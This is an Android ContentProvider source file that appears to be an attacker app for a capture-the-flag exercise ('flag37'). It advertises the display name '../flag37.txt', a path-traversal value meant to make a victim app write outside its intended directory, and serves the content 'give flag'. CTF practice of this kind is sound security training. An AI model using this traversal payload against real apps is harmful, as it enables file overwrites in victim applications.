package com.appdev.intentattacks;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.database.Cursor;
import android.database.MatrixCursor;
import android.net.Uri;
import android.os.ParcelFileDescriptor;
import android.provider.OpenableColumns;
import android.util.Log;

import java.io.FileNotFoundException;
import java.io.IOException;

public class Flag37Provider extends ContentProvider {
    private static final String TAG = "Flag37Provider";
    private static final String MIME_TYPE = "text/plain";

    @Override
    public boolean onCreate() {
        Log.i(TAG, "onCreate()");
        return true;
    }

    @Override
    public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) {
        Log.i(TAG, "query(" + uri.toString() + ")");
        
        MatrixCursor cursor = new MatrixCursor(new String[]{
                OpenableColumns.DISPLAY_NAME, OpenableColumns.SIZE
        });
        
        cursor.addRow(new Object[]{
                "../flag37.txt", 1337L
        });
        
        return cursor;
    }

    @Override
    public String getType(Uri uri) {
        Log.i(TAG, "getType(" + uri.toString() + ")");
        return MIME_TYPE;
    }

    @Override
    public ParcelFileDescriptor openFile(Uri uri, String mode) throws FileNotFoundException {
        Log.i(TAG, "openFile(" + uri.toString() + ")");
        
        try {
            ParcelFileDescriptor[] pipe = ParcelFileDescriptor.createPipe();
            ParcelFileDescriptor.AutoCloseOutputStream outputStream = 
                new ParcelFileDescriptor.AutoCloseOutputStream(pipe[1]);

            new Thread(() -> {
                try {
                    outputStream.write("give flag".getBytes());
                    outputStream.close();
                } catch (IOException e) {
                    Log.e(TAG, "Error writing to pipe", e);
                }
            }).start();

            return pipe[0];
        } catch (IOException e) {
            throw new FileNotFoundException("Could not open pipe for: " + uri.toString());
        }
    }

    @Override
    public Uri insert(Uri uri, ContentValues values) {
        Log.i(TAG, "insert(" + uri.toString() + ")");
        return null;
    }

    @Override
    public int delete(Uri uri, String selection, String[] selectionArgs) {
        Log.i(TAG, "delete(" + uri.toString() + ")");
        return 0;
    }

    @Override
    public int update(Uri uri, ContentValues values, String selection, String[] selectionArgs) {
        Log.i(TAG, "update(" + uri.toString() + ")");
        return 0;
    }
} 